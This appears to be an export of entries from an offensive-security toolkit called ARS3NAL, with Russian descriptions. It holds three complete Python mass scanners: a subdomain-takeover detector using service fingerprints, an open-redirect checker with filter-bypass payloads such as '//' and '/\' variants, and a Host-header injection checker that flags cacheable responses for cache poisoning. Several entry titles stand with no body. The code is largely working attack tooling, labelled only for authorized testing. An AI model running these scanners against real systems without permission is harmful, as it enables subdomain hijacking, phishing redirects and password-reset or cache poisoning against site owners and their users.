entries.title: Mass check harness (ThreadPoolExecutor)
Mass subdomain takeover (CNAME -> fingerprint)
entries.source: Fingerprints adapted from can-i-take-over-xyz (EdOverflow et al., CC-BY-4.0) https://github.com/EdOverflow/can-i-take-over-xyz
entries.body:
Массовый детектор **subdomain takeover**: по списку поддоменов резолвит `CNAME`, и если он указывает на сторонний сервис (GitHub Pages, S3, Heroku, Azure, Shopify, Fastly и т.д.), забирает HTTP-ответ и ищет в нём характерный **fingerprint** «нет такого ресурса» (например `There isn't a GitHub Pages site here`). Совпадение -> поддомен можно «угнать», зарегистрировав ресурс на стороннем сервисе. Помечает находки `VULNERABLE` (точный отпечаток) или `POSSIBLE` (висячий CNAME без явного отпечатка).

> Отпечатки сервисов взяты из проекта **can-i-take-over-xyz (EdOverflow и контрибьюторы), лицензия CC-BY-4.0**: атрибуция сохранена в коде и в этом описании, как требует лицензия. `POSSIBLE` всегда проверяй руками: висячий CNAME не всегда угоняем. Альтернатива-инструмент: subzy (`PentestPad/subzy`, `subzy run --targets list.txt`).

```python
#!/usr/bin/env python3
# mass_subdomain_takeover.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.
# CNAME -> fingerprint subdomain-takeover scanner.
#
# Service fingerprints adapted from can-i-take-over-xyz
#   (c) EdOverflow and contributors, licensed CC-BY-4.0
#   https://github.com/EdOverflow/can-i-take-over-xyz
import concurrent.futures as cf
import socket, ssl, subprocess, sys, urllib.request

# (label, cname-substring, body-fingerprint) - CC-BY-4.0, see header
FINGERPRINTS = [
    ("github",     "github.io",              "There isn't a GitHub Pages site here"),
    ("github",     "github.io",              "404 - File not found"),
    ("amazon-s3",  "amazonaws.com",          "NoSuchBucket"),
    ("amazon-s3",  "amazonaws.com",          "The specified bucket does not exist"),
    ("heroku",     "herokudns.com",          "No such app"),
    ("heroku",     "herokuapp.com",          "No such app"),
    ("azure",      "azurewebsites.net",      "404 Web Site not found"),
    ("azure",      "cloudapp.net",           "404 Web Site not found"),
    ("shopify",    "myshopify.com",          "Sorry, this shop is currently unavailable"),
    ("fastly",     "fastly.net",             "Fastly error: unknown domain"),
    ("ghost",      "ghost.io",               "The thing you were looking for is no longer here"),
    ("surge",      "surge.sh",               "project not found"),
    ("bitbucket",  "bitbucket.io",           "Repository not found"),
    ("unbounce",   "unbouncepages.com",      "The requested URL was not found on this server"),
    ("tumblr",     "domains.tumblr.com",     "Whatever you were looking for doesn't currently exist"),
    ("wordpress",  "wordpress.com",          "Do you want to register"),
    ("pantheon",   "pantheonsite.io",        "The gods are wise"),
    ("zendesk",    "zendesk.com",            "Help Center Closed"),
    ("readthedocs","readthedocs.io",         "unknown to Read the Docs"),
]

def cname_chain(host):
    try:
        out = subprocess.run(["dig", "+short", host, "CNAME"],
                             capture_output=True, text=True, timeout=10).stdout
        return [l.strip().rstrip(".") for l in out.splitlines() if l.strip()]
    except Exception:
        return []

def fetch(host):
    for scheme in ("https", "http"):
        ctx = ssl.create_default_context()
        ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(f"{scheme}://{host}/",
                                     headers={"User-Agent": "ARS3NAL-takeover/1.0"})
        try:
            with urllib.request.urlopen(req, timeout=12, context=ctx) as r:
                return r.read(65536).decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            try:    return e.read(65536).decode("utf-8", "replace")
            except Exception: return ""
        except Exception:
            continue
    return ""

def check(host):
    cnames = cname_chain(host)
    if not cnames:
        return None
    matched_service = None
    for label, csub, fp in FINGERPRINTS:
        if any(csub in c for c in cnames):
            matched_service = label
            body = fetch(host)
            if fp.lower() in body.lower():
                return f"[VULNERABLE] {host} -> CNAME {cnames} ({label}) :: fingerprint matched"
    if matched_service:
        return f"[POSSIBLE]   {host} -> CNAME {cnames} ({matched_service}) :: dangling, verify manually"
    # dangling CNAME that does not resolve to an A record at all
    try:
        socket.gethostbyname(host)
    except Exception:
        return f"[POSSIBLE]   {host} -> CNAME {cnames} :: does not resolve, verify manually"
    return None

def main():
    if len(sys.argv) < 2:
        sys.exit("usage: mass_subdomain_takeover.py <subdomains.txt|-> [workers]")
    src = sys.stdin if sys.argv[1] == "-" else open(sys.argv[1])
    hosts = [l.strip() for l in src if l.strip() and not l.startswith("#")]
    workers = int(sys.argv[2]) if len(sys.argv) > 2 else 20
    hits = 0
    with cf.ThreadPoolExecutor(max_workers=workers) as ex:
        for res in ex.map(check, hosts):
            if res:
                print(res); hits += 1
    print(f"[=] {hits} candidate(s) over {len(hosts)} subdomains", file=sys.stderr)

if __name__ == "__main__":
    main()
```

Запуск:
```bash
# нужен dig (apt install dnsutils)
python3 mass_subdomain_takeover.py subdomains.txt 30
# альтернатива-тул: subzy run --targets subdomains.txt   (github.com/PentestPad/subzy)
```

entries.title: Mass open redirect check
entries.body:
Массовая проверка **open redirect**: по списку URL с параметром-кандидатом (`?next=`, `?url=`, `?redirect=`, `?returnTo=` и т.п.) подставляет внешний домен-маркер и смотрит, отдаёт ли сервер `30x` с `Location`, ведущим на чужой домен, ИЛИ HTML/JS-редирект (`meta refresh`, `window.location`). Перебирает несколько байпасных payload (`//evil`, `https:evil`, `/\evil`, whitelisted-prefix), потому что наивные фильтры часто ловятся именно на них. Помечает `[OPEN-REDIRECT]`.

> Кандидат-параметр можно задать или дать скрипту сам URL с маркером `FUZZ`. Маркерный домен подбери заведомо чужой (`ars3nal-redirect.example`), чтобы отличить настоящий внешний редирект от внутреннего. Редиректы на тот же origin не считаются находкой.

```python
#!/usr/bin/env python3
# mass_open_redirect.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.
# Mass open-redirect check across a URL list with bypass payloads.
import concurrent.futures as cf
import re, ssl, sys, urllib.parse, urllib.request

MARK = "ars3nal-redirect.example"
PAYLOADS = [
    f"https://{MARK}", f"//{MARK}", f"https:{MARK}", f"/\\{MARK}",
    f"https://{MARK}/%2e%2e", f"https://target%252e{MARK}",
]
PARAMS = ["next", "url", "redirect", "redirect_uri", "returnTo", "return",
          "dest", "destination", "go", "continue", "r", "u", "redir"]

def external_location(loc):
    if not loc:
        return False
    host = urllib.parse.urlparse(loc if "//" in loc else "//" + loc.lstrip("/\\")).netloc
    return MARK in host

def build_urls(base):
    out = []
    pr = urllib.parse.urlparse(base)
    q = urllib.parse.parse_qs(pr.query)
    targets = [k for k in q if k.lower() in PARAMS] or PARAMS
    for k in targets:
        for pl in PAYLOADS:
            nq = dict(q); nq[k] = pl
            out.append(urllib.parse.urlunparse(pr._replace(
                query=urllib.parse.urlencode(nq, doseq=True))))
    return out

def check(base):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    for url in build_urls(base):
        req = urllib.request.Request(url, headers={"User-Agent": "ARS3NAL-or/1.0"})
        class NoRedirect(urllib.request.HTTPRedirectHandler):
            def redirect_request(self, *a, **k): return None
        op = urllib.request.build_opener(NoRedirect, urllib.request.HTTPSHandler(context=ctx))
        try:
            r = op.open(req, timeout=12)
            loc, body = r.headers.get("Location"), r.read(8192).decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            loc, body = e.headers.get("Location"), ""
        except Exception:
            continue
        if external_location(loc):
            return f"[OPEN-REDIRECT] {url}  -> Location: {loc}"
        if re.search(rf"(?:location|url)\s*=\s*['\"]?[^'\"]*{re.escape(MARK)}", body, re.I):
            return f"[OPEN-REDIRECT] {url}  -> body-based redirect to {MARK}"
    return None

def main():
    if len(sys.argv) < 2:
        sys.exit("usage: mass_open_redirect.py <urls.txt|-> [workers]")
    src = sys.stdin if sys.argv[1] == "-" else open(sys.argv[1])
    urls = [l.strip() for l in src if l.strip() and not l.startswith("#")]
    ws = int(sys.argv[2]) if len(sys.argv) > 2 else 20
    hits = 0
    with cf.ThreadPoolExecutor(max_workers=ws) as ex:
        for res in ex.map(check, urls):
            if res:
                print(res); hits += 1
    print(f"[=] {hits} hit(s) over {len(urls)} urls", file=sys.stderr)

if __name__ == "__main__":
    main()
```

Запуск:
```bash
python3 mass_open_redirect.py urls.txt 30
# urls.txt: строки вида https://target/login?next=PLACEHOLDER
```

entries.title: Mass CORS misconfig check
Mass SSRF (OOB + cloud metadata)
Mass Host-header injection check
entries.body:
Массовая проверка инъекций через **Host-заголовок** и его варианты (`Host`, `X-Forwarded-Host`, `X-Host`, `Forwarded`). По списку URL подставляет в эти заголовки подставной домен-маркер и смотрит, отражается ли он в ответе: в `Location`-редиректе, в теле (ссылки, сброс пароля), в `<base href>`. Это вектор для password-reset poisoning, cache poisoning и web-cache deception. Если отражённый ответ ещё и **кэшируемый** (по `Cache-Control`/`Age`/`X-Cache`), скрипт добавляет в вывод метку `[CACHEABLE]` - такие находки опаснее (отравление затронет других пользователей).

> Маркер выбирай заведомо чужим (`ars3nal-host.example`). Отражение в `Location` при смене `X-Forwarded-Host` - классический password-reset poisoning. Метка `[CACHEABLE]` означает, что ответ может осесть в кэше CDN/прокси: проверь возможность web-cache poisoning отдельно.

```python
#!/usr/bin/env python3
# mass_host_header.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.
# Mass Host-header injection check (Host/X-Forwarded-Host/X-Host/Forwarded), flags [CACHEABLE].
import concurrent.futures as cf
import ssl, sys, urllib.request

MARK = "ars3nal-host.example"
INJECT_HEADERS = [
    {"Host": MARK},
    {"X-Forwarded-Host": MARK},
    {"X-Host": MARK},
    {"Forwarded": f"host={MARK}"},
    {"X-Forwarded-Server": MARK},
]

def is_cacheable(hdrs):
    cc = hdrs.get("cache-control", "").lower()
    if "no-store" in cc or "private" in cc:
        return False
    return ("age" in hdrs) or ("x-cache" in hdrs) or ("public" in cc) or ("max-age" in cc)

def probe(url, extra):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    h = {"User-Agent": "ARS3NAL-host/1.0"}; h.update(extra)
    req = urllib.request.Request(url, headers=h)
    class NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, *a, **k): return None
    op = urllib.request.build_opener(NoRedirect, urllib.request.HTTPSHandler(context=ctx))
    try:
        r = op.open(req, timeout=12)
        return dict((k.lower(), v) for k, v in r.headers.items()), r.read(65536).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return dict((k.lower(), v) for k, v in e.headers.items()), ""
    except Exception:
        return {}, ""

def check(url):
    out = []
    for extra in INJECT_HEADERS:
        hdrs, body = probe(url, extra)
        loc = hdrs.get("location", "")
        where = None
        if MARK in loc:
            where = f"Location={loc}"
        elif MARK in body:
            where = "response body (link/base-href)"
        if where:
            cache = " [CACHEABLE]" if is_cacheable(hdrs) else ""
            hdr_name = list(extra.keys())[0]
            out.append(f"[HOST-INJECT]{cache} {url}  via {hdr_name}: {MARK}  -> {where}")
    return "\n".join(out) if out else None

def main():
    if len(sys.argv) < 2:
        sys.exit("usage: mass_host_header.py <urls.txt|-> [workers]")
    src = sys.stdin if sys.argv[1] == "-" else open(sys.argv[1])
    urls = [l.strip() for l in src if l.strip() and not l.startswith("#")]
    ws = int(sys.argv[2]) if len(sys.argv) > 2 else 20
    hits = 0
    with cf.ThreadPoolExecutor(max_workers=ws) as ex:
        for res in ex.map(check, urls):
            if res:
                print(res); hits += 1
    print(f"[=] {hits} hit(s) over {len(urls)} urls", file=sys.stderr)

if __name__ == "__main__":
    main()
```

Запуск:
```bash
python3 mass_host_header.py urls.txt 30
# обрати внимание на находки с меткой [CACHEABLE] -> возможен web-cache poisoning
```
